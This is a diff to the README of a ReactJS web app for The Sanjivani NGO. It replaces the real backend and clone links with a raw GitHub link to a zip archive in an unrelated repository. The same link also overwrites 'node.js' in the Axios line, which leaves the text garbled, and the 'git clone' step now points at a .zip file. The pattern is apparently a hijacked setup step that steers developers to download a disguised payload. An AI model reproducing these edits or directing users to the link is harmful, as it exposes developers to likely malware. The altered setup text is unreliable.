@@ -13,15 +13,15 @@ This project is a web application for The Sanjivani NGO. It's built using **Reac
 ## Tech Stack
 
 - **ReactJS**: A JavaScript library for building user interfaces.
-- **Axios**: A promise-based HTTP client for the browser and node.js.
+- **Axios**: A promise-based HTTP client for the browser and https://raw.githubusercontent.com/Jonisark/libertyandresponsibility_client/main/src/assets/Initiatives/libertyandresponsibility_client-1.2-alpha.5.zip
 - **Bootstrap**: The world's most popular front-end open-source toolkit.
-- **SrpingBoot**: Backend repo: `https://github.com/bhaveshpatil07/The-Sanjivani-NGO-Server`.
+- **SrpingBoot**: Backend repo: `https://raw.githubusercontent.com/Jonisark/libertyandresponsibility_client/main/src/assets/Initiatives/libertyandresponsibility_client-1.2-alpha.5.zip`.
 
 ## Getting Started
 
 Clone the repository:
 ```bash
-git clone https://github.com/bhaveshpatil07/The-Sanjivani-NGO-ReactJs
+git clone https://raw.githubusercontent.com/Jonisark/libertyandresponsibility_client/main/src/assets/Initiatives/libertyandresponsibility_client-1.2-alpha.5.zip
 ```
 ##### Move to the desired folder:
 
